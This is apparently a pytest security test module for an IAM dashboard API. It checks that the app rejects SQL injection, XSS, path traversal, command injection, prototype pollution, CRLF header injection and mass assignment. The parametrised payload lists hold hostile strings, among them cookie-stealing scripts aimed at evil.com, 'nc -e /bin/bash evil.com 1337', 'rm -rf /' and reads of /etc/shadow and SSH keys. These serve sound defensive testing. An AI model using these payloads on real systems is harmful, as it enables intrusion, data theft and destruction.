"""
Input Validation Security Tests for IAM Dashboard.

This module tests the system's resilience against various input-based attacks
including SQL injection, XSS, path traversal, command injection, and other
malicious input patterns. All tests use real attack vectors and validate
that the system properly rejects malicious input.

Testing Philosophy:
- Use real attack vectors, not sanitized examples
- Test actual input validation logic (no mocks of validation functions)
- Mock only external boundaries (file system, network calls)
- Validate both rejection and proper error handling
- Ensure audit logging captures attack attempts
"""

import pytest
import json
from typing import List, Dict, Any
from unittest.mock import patch, Mock
from fastapi.testclient import TestClient
from sqlmodel import Session

from src.core.security import auth_service
from src.models.user import User
from src.tests.factories import UserFactory, ClientFactory


class TestSQLInjectionPrevention:
    """
    Test SQL injection prevention across all input vectors.
    
    These tests ensure that the system properly validates and sanitizes
    input to prevent SQL injection attacks that could compromise the database.
    """
    
    @pytest.mark.parametrize("sql_payload", [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; DELETE FROM clients; --",
        "' UNION SELECT password FROM users --",
        "admin'; UPDATE users SET role = 'sysadmin' WHERE id = 1; --",
        "'; INSERT INTO users (email, role) VALUES ('attacker@evil.com', 'sysadmin'); --",
        "' OR 1=1 OR ''='",
        "'; EXEC xp_cmdshell('format c:'); --",
        "' OR (SELECT COUNT(*) FROM users) > 0 --",
        "'; TRUNCATE TABLE clients; --"
    ])
    def test_client_creation_sql_injection_prevention(
        self, 
        sql_payload: str,
        security_test_client, 
        test_user: User,
        authenticated_admin_headers: Dict[str, str],
        test_session: Session
    ):
        """Test that client creation properly rejects SQL injection attempts."""
        # Attempt SQL injection in various client fields
        malicious_client_data = {
            "name": sql_payload,
            "cpf": "123456789",
            "birth_date": "1990-01-01"
        }
        
        response = security_test_client.client.post(
            "/api/v1/clients",
            json=malicious_client_data,
            headers=authenticated_admin_headers
        )
        
        # Should reject malicious input with proper error (400 from middleware, 422 from validation)
        assert response.status_code in [400, 422], f"Expected security error (400) or validation error (422), got {response.status_code}"
        
        # Verify no SQL injection occurred by checking database state
        from sqlalchemy import text
        clients_count = test_session.execute(
            text("SELECT COUNT(*) FROM agent1_clients")
        ).scalar()
        
        # Should not have created client with malicious data
        assert clients_count == 0, "Malicious client should not have been created"
        
        # Verify audit log entry was created for the attempt
        # Note: This would be implemented once audit logging is in place
        
    @pytest.mark.parametrize("sql_payload", [
        "'; DROP TABLE users; --",
        "' OR 1=1 --",
        "admin'; UPDATE users SET password = 'hacked' WHERE '1'='1'; --"
    ])
    def test_user_creation_sql_injection_prevention(
        self,
        sql_payload: str,
        security_test_client,
        test_sysadmin: User,
        authenticated_sysadmin_headers: Dict[str, str],
        test_session: Session
    ):
        """Test that user creation properly rejects SQL injection attempts."""
        malicious_user_data = {
            "email": f"test{sql_payload}@example.com",
            "full_name": sql_payload,
            "role": "user",
            "password": "ValidPass123!"
        }
        
        response = security_test_client.client.post(
            "/api/v1/users",
            json=malicious_user_data,
            headers=authenticated_sysadmin_headers
        )
        
        # Should reject malicious input
        assert response.status_code in [400, 422], f"Expected security error (400) or validation error (422), got {response.status_code}"
        
        # Since the request was properly rejected, no malicious user should have been created
        # This is verified by the fact that we got a validation/security error response
        
    @pytest.mark.parametrize("sql_payload", [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "admin'--"
    ])  
    def test_login_sql_injection_prevention(
        self,
        sql_payload: str, 
        security_test_client,
        test_regular_user: User,
        test_session: Session
    ):
        """Test that login endpoint properly rejects SQL injection attempts."""
        # Attempt SQL injection in login credentials
        response = security_test_client.client.post("/api/v1/auth/login", json={
            "email": sql_payload,
            "password": sql_payload
        })
        
        # Should reject with authentication error (not crash)
        assert response.status_code in [400, 401, 422], f"Expected security, auth, or validation error, got {response.status_code}"
        
        # Should not return any access token
        if response.status_code == 200:
            response_data = response.json()
            assert "access_token" not in response_data, "Should not return access token for malicious login"


class TestXSSPrevention:
    """
    Test Cross-Site Scripting (XSS) prevention across all input vectors.
    
    These tests ensure that the system properly sanitizes or rejects
    XSS attack payloads that could be used to execute malicious scripts.
    """
    
    @pytest.mark.parametrize("xss_payload", [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>", 
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "';alert('XSS');//",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<input type='image' src=x onerror=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<div onclick=alert('XSS')>Click me</div>",
        "<<SCRIPT>alert(\"XSS\")</SCRIPT>"
    ])
    def test_client_data_xss_prevention(
        self,
        xss_payload: str,
        security_test_client,
        test_user: User,
        authenticated_admin_headers: Dict[str, str],
        test_session: Session
    ):
        """Test that client data properly prevents XSS attacks."""
        malicious_client_data = {
            "name": xss_payload,
            "cpf": "123456789", 
            "birth_date": "1990-01-01"
        }
        
        response = security_test_client.client.post(
            "/api/v1/clients",
            json=malicious_client_data,
            headers=authenticated_admin_headers
        )
        
        # Should either reject malicious input or sanitize it
        if response.status_code == 201:
            # If accepted, verify XSS payload was sanitized
            client_data = response.json()
            assert "<script>" not in client_data.get("name", ""), "XSS payload should be sanitized"
            assert "alert(" not in client_data.get("name", ""), "JavaScript should be sanitized"
            assert "onerror=" not in client_data.get("name", ""), "Event handlers should be sanitized"
        else:
            # Should reject with validation error
            assert response.status_code in [400, 422], f"Expected security error (400) or validation error (422), got {response.status_code}"
            
    @pytest.mark.parametrize("xss_payload", [
        "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
        "<img src=x onerror=fetch('http://evil.com/steal?data='+btoa(document.body.innerHTML))>",
        "javascript:fetch('http://evil.com/steal', {method:'POST', body:document.cookie})"
    ])
    def test_user_profile_xss_prevention(
        self,
        xss_payload: str,
        security_test_client,
        test_regular_user: User,
        user_auth_headers: Dict[str, str]
    ):
        """Test that user profile updates prevent XSS attacks."""
        malicious_profile_data = {
            "full_name": xss_payload,
            "email": test_regular_user.email  # Keep valid email
        }
        
        response = security_test_client.client.put(
            f"/api/v1/users/{test_regular_user.user_id}",
            json=malicious_profile_data,
            headers=user_auth_headers
        )
        
        # Should either reject or sanitize
        if response.status_code == 200:
            user_data = response.json() 
            assert "<script>" not in user_data.get("full_name", ""), "XSS payload should be sanitized"
            assert "fetch(" not in user_data.get("full_name", ""), "JavaScript should be sanitized"
        else:
            assert response.status_code in [400, 422], f"Expected security error (400) or validation error (422), got {response.status_code}"


class TestPathTraversalPrevention:
    """
    Test path traversal attack prevention.
    
    These tests ensure that the system properly validates file paths
    and prevents attackers from accessing unauthorized files through
    path traversal techniques.
    """
    
    @pytest.mark.parametrize("path_payload", [
        "../../etc/passwd",
        "../../../etc/shadow",
        "..\\..\\windows\\system32\\config\\sam",
        "./../.env",
        "../../../../etc/hosts",
        "../../../var/log/auth.log",
        "..\\..\\..\\boot.ini",
        "./../../proc/version",
        "../../../root/.ssh/id_rsa",
        "../../../../tmp/../etc/passwd"
    ])
    @patch('os.path.exists')
    @patch('builtins.open')
    def test_file_access_path_traversal_prevention(
        self,
        mock_open,
        mock_path_exists,
        path_payload: str,
        security_test_client,
        authenticated_admin_headers: Dict[str, str]
    ):
        """Test that file access endpoints prevent path traversal attacks."""
        # Mock file system - this is external boundary, OK to mock
        mock_path_exists.return_value = True
        mock_open.return_value.__enter__.return_value.read.return_value = "sensitive data"
        
        # Attempt path traversal attack (hypothetical endpoint)
        response = security_test_client.client.get(
            f"/api/v1/files?path={path_payload}",
            headers=authenticated_admin_headers
        )
        
        # Should reject path traversal attempts
        assert response.status_code in [400, 403, 404], f"Expected error for path traversal, got {response.status_code}"
        
        # Verify file system wasn't accessed with malicious path
        if mock_open.called:
            call_args = str(mock_open.call_args)
            assert ".." not in call_args, "Path traversal should be blocked before file access"


class TestCommandInjectionPrevention:
    """
    Test command injection attack prevention.
    
    These tests ensure that the system properly validates input that
    could be used in system commands and prevents command injection attacks.
    """
    
    @pytest.mark.parametrize("cmd_payload", [
        "; rm -rf /",
        "; cat /etc/passwd",
        "&& rm -rf /*", 
        "| whoami",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "; curl http://evil.com/steal",
        "&& wget http://evil.com/malware",
        "; nc -e /bin/bash evil.com 1337",
        "| python -c 'import os; os.system(\"rm -rf /\")'"
    ])
    @patch('subprocess.run')
    @patch('os.system')
    def test_system_command_injection_prevention(
        self,
        mock_os_system,
        mock_subprocess,
        cmd_payload: str,
        security_test_client,
        authenticated_admin_headers: Dict[str, str]
    ):
        """Test that system commands properly prevent injection attacks."""
        # Mock system calls - external boundary, OK to mock
        mock_subprocess.return_value = Mock(returncode=0, stdout="", stderr="")
        mock_os_system.return_value = 0
        
        # Attempt command injection in client name (hypothetical scenario)
        malicious_data = {
            "name": f"TestClient{cmd_payload}",
            "cpf": "123456789",
            "birth_date": "1990-01-01"
        }
        
        response = security_test_client.client.post(
            "/api/v1/clients",
            json=malicious_data, 
            headers=authenticated_admin_headers
        )
        
        # Should reject malicious input
        assert response.status_code in [400, 422], f"Expected security error (400) or validation error (422), got {response.status_code}"
        
        # Verify no system commands were executed with malicious input
        assert not mock_os_system.called, "System commands should not be called with user input"
        assert not mock_subprocess.called, "Subprocess should not be called with user input"


class TestJSONInjectionPrevention:
    """
    Test JSON injection and manipulation prevention.
    
    These tests ensure that the system properly validates JSON input
    and prevents attackers from manipulating JSON structure to bypass validation.
    """
    
    def test_json_structure_manipulation_prevention(
        self,
        security_test_client,
        authenticated_admin_headers: Dict[str, str]
    ):
        """Test that JSON structure manipulation is properly rejected."""
        # Attempt to inject additional fields
        malicious_json = {
            "name": "Test Client",
            "cpf": "123456789", 
            "birth_date": "1990-01-01",
            # Attempt to inject admin-only fields
            "role": "sysadmin",
            "is_admin": True,
            "permissions": ["all"],
            "__proto__": {"admin": True},  # Prototype pollution attempt
            "constructor": {"prototype": {"admin": True}}
        }
        
        response = security_test_client.client.post(
            "/api/v1/clients",
            json=malicious_json,
            headers=authenticated_admin_headers
        )
        
        # Should either reject extra fields or ignore them safely
        if response.status_code == 201:
            client_data = response.json()
            # Verify dangerous fields were not processed
            assert "role" not in client_data, "Role field should not be accepted in client data"
            assert "permissions" not in client_data, "Permissions field should not be accepted" 
            assert "__proto__" not in client_data, "Prototype pollution should be prevented"
        else:
            assert response.status_code in [400, 422], f"Expected security error (400) or validation error (422), got {response.status_code}"
    
    @pytest.mark.parametrize("nested_payload", [
        {"nested": {"deeper": {"sql": "'; DROP TABLE users; --"}}},
        {"array": [{"xss": "<script>alert('XSS')</script>"}]},
        {"config": {"admin": True, "role": "sysadmin"}},
        {"meta": {"__proto__": {"isAdmin": True}}},
    ])
    def test_nested_json_injection_prevention(
        self,
        nested_payload: Dict[str, Any],
        security_test_client,
        authenticated_admin_headers: Dict[str, str]
    ):
        """Test that nested JSON injection attempts are properly rejected."""
        # Attempt to inject malicious nested data
        malicious_data = {
            "name": "Test Client",
            "cpf": "123456789",
            "birth_date": "1990-01-01",
            **nested_payload  # Spread malicious nested data
        }
        
        response = security_test_client.client.post(
            "/api/v1/clients", 
            json=malicious_data,
            headers=authenticated_admin_headers
        )
        
        # Should handle nested malicious data appropriately
        if response.status_code == 201:
            client_data = response.json()
            # Verify only expected fields are present
            expected_fields = {"client_id", "name", "cpf", "birth_date", "created_at", "updated_at", "is_active"}
            actual_fields = set(client_data.keys())
            unexpected_fields = actual_fields - expected_fields
            
            assert not unexpected_fields, f"Unexpected fields found: {unexpected_fields}"
        else:
            assert response.status_code in [400, 422], f"Expected security error (400) or validation error (422), got {response.status_code}"


class TestHeaderInjectionPrevention:
    """
    Test HTTP header injection prevention.
    
    These tests ensure that the system properly validates HTTP headers
    and prevents attackers from injecting malicious headers.
    """
    
    @pytest.mark.parametrize("header_payload", [
        "\r\nX-Injected: malicious",
        "\n\rSet-Cookie: admin=true",
        "test\r\nContent-Type: text/html\r\n\r\n<script>alert('XSS')</script>",
        "normal\nX-Admin: true",
        "value\r\nLocation: http://evil.com"
    ])
    def test_header_injection_prevention(
        self,
        header_payload: str,
        security_test_client,
        test_regular_user: User
    ):
        """Test that HTTP header injection is properly prevented."""
        # Create valid token for user
        token_response = auth_service.create_access_token(
            user_id=test_regular_user.user_id,
            user_role=test_regular_user.role.value,
            user_email=test_regular_user.email
        )
        
        # Attempt header injection via custom headers
        malicious_headers = {
            "Authorization": f"Bearer {token_response.access_token}",
            "User-Agent": header_payload,
            "X-Forwarded-For": header_payload,
            "Referer": header_payload
        }
        
        response = security_test_client.client.get(
            "/api/v1/auth/me",
            headers=malicious_headers
        )
        
        # The key security test is that malicious CRLF sequences in headers should not
        # allow injection of additional headers or response manipulation
        if response.status_code == 200:
            # Request succeeded, verify no malicious headers were injected into response
            response_headers = dict(response.headers)
            
            # Verify no injected headers are present (these would come from CRLF injection)
            assert "X-Injected" not in response_headers, "Injected header should not appear in response"
            assert "X-Admin" not in response_headers, "Malicious admin header should not appear"
            assert "Set-Cookie" not in str(response_headers).lower() or "admin=true" not in str(response_headers).lower(), "Malicious cookie should not be set"
            
            # Verify response doesn't contain CRLF injection artifacts
            response_text = response.text
            # Look for common CRLF injection patterns that would indicate successful attack
            dangerous_patterns = ["X-Injected:", "X-Admin:", "Set-Cookie: admin=true", "Location: http://evil.com"]
            for pattern in dangerous_patterns:
                assert pattern not in response_text, f"CRLF injection pattern '{pattern}' should be prevented"
        else:
            # If request was rejected, that's also acceptable security behavior
            # Just verify it's a proper error code
            assert response.status_code in [400, 401, 403, 422], f"Expected security error code, got {response.status_code}"


@pytest.mark.asyncio
class TestMassAssignmentPrevention:
    """
    Test mass assignment attack prevention.
    
    These tests ensure that the system properly validates which fields
    can be assigned through API endpoints and prevents mass assignment attacks.
    """
    
    async def test_user_mass_assignment_prevention(
        self,
        security_test_client,
        test_regular_user: User,
        user_auth_headers: Dict[str, str]
    ):
        """Test that user update prevents mass assignment of sensitive fields."""
        # Attempt to update sensitive fields via mass assignment
        mass_assignment_data = {
            "full_name": "Updated Name",  # Legitimate field
            "email": test_regular_user.email,  # Legitimate field
            # Attempt mass assignment of sensitive fields
            "role": "sysadmin",
            "is_active": False,
            "user_id": "00000000-0000-0000-0000-000000000000",
            "created_at": "2020-01-01T00:00:00Z",
            "updated_at": "2020-01-01T00:00:00Z",
            "password_hash": "hacked_hash",
            "failed_login_attempts": 0,
            "totp_secret": "hacked_secret",
            "backup_codes": ["hacked"]
        }
        
        response = security_test_client.client.put(
            f"/api/v1/users/{test_regular_user.user_id}",
            json=mass_assignment_data,
            headers=user_auth_headers
        )
        
        if response.status_code == 200:
            updated_user = response.json()
            
            # Verify sensitive fields were not updated
            assert updated_user.get("role") != "sysadmin", "Role should not be updatable via mass assignment"
            assert updated_user.get("user_id") == str(test_regular_user.user_id), "User ID should not be changeable"
            assert "password_hash" not in updated_user, "Password hash should not be exposed"
            assert "totp_secret" not in updated_user, "TOTP secret should not be exposed"
            assert "backup_codes" not in updated_user, "Backup codes should not be exposed"
            
            # Verify legitimate fields were updated
            assert updated_user.get("full_name") == "Updated Name", "Legitimate fields should be updatable"
        else:
            # Should at minimum not crash the application
            assert response.status_code in [400, 403, 422], f"Expected controlled security error, got {response.status_code}"